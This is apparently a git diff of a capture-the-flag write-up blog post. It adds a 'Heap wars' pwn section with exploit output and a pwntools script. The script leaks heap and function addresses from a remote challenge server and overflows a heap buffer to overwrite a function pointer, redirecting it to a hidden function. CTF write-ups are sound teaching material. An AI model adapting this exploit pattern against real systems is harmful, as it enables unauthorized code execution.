@@ -7,7 +7,7 @@ description: "A special CTF from P3rf3ctr00t"
 useRelativeCover: true
 categories: [Capture The Flag]
 ---
-
+# Android
 ## Dash
 
 ![img-description](1.png)
@@ -823,3 +823,60 @@ Running the app with the new code we finnally get our flag;
 ![img-desc](7_11.png)
 
 The flag was hardcoded in the game, allowing it to be retrieved easily without completing the intended steps. However, that wasn’t my goal when designing the challenge; and yet, no one managed to solve it.
+
+# PWN
+## Heap wars
+![img-desc](8.png)
+
+```bash
+python exploit.py
+...
+[+] Opening connection to 94.72.112.248 on port 1337: Done
+[*] Switching to interactive mode
+ Flag content:
+r00t{h34p_0v3rfl0w_1n_th3_f0rc3_1ebfe9e04a01ac4b00d4bd194b1bd505}Jedi code saved.
+====== Jedi Training Menu ======
+1. Enter your Jedi code
+2. Jedi data
+3. Jedi next bounty
+4. Exit
+Enter your choice: $
+```
+
+```python
+from pwn import *
+
+filename = "./challenge/challenge/heap_wars"
+
+elf = ELF(filename)
+#context.log_level = 'debug'
+context.binary = elf
+
+# p = process(filename)
+
+p = remote('94.72.112.248', 1337)
+
+p.recvuntil(b'Enter your choice:')
+p.sendline(b'2')
+p.recvuntil(b"Jedi data: ")
+data_address = p.recvline()
+int_data_address = int(data_address.strip(), 16)
+
+p.recvuntil(b'Enter your choice:')
+p.sendline(b'3')
+p.recvuntil(b"Jedi bounty: ")
+function_address = p.recvline()
+int_function_address = int(function_address.strip(), 16)
+
+the_force_function_address = elf.symbols['theForce']
+
+padding = b'A' * (int_function_address - int_data_address)
+payload = padding + p64(the_force_function_address)
+
+p.recvuntil(b'Enter your choice:')
+p.sendline(b'1')
+p.recvuntil(b'Enter your Jedi code:')
+p.sendline(payload)
+
+p.interactive()
+```
